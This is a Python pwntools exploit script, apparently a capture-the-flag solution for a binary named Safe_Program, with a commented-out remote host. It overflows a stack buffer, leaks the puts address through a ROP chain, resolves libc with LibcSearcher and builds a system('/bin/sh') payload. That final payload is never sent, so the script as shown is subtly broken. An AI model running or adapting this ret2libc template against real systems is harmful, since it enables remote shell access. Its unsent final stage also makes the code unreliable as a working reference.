from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']


def sl(x): return io.sendline(x)
def sd(x): return io.send(x)


def sa(x, y): return io.sendafter(x, y)
def sla(x, y): return io.sendlineafter(x, y)
def rc(x): return io.recv(x)
def rl(): return io.recvline()
def ru(x): return io.recvuntil(x)
def ita(): return io.interactive()
def slc(): return asm(shellcraft.sh())


def uu64(x): return u64(x.ljust(8, b'\0'))
def uu32(x): return u32(x.ljust(4, b'\0'))


def gdba(x=''):
    if type(io) == pwnlib.tubes.remote.remote:
        return
    elif type(io) == pwnlib.tubes.process.process:
        gdb.attach(io, x)
        pause()


io = process('./Safe_Program')
elf = ELF('./Safe_Program')
# io = remote('43.143.254.94',10326)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_add = 0x401247
pop_rdi_ret = 0x0000000000401393
pay = flat([b'a'*(0x80+8), pop_rdi_ret, puts_got, puts_plt, main_add])
ru(b'now:\n\n')
sleep(4)
sl(pay)
puts_addr = uu64(rc(6))
print(hex(puts_addr))
# gdba('b *0x40122b')
libc = LibcSearcher('puts', puts_addr)
pause()
libc.select_libc()
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
pay = flat([b'a'*(0x80+8), pop_rdi_ret, binsh_addr, system_addr])

ita()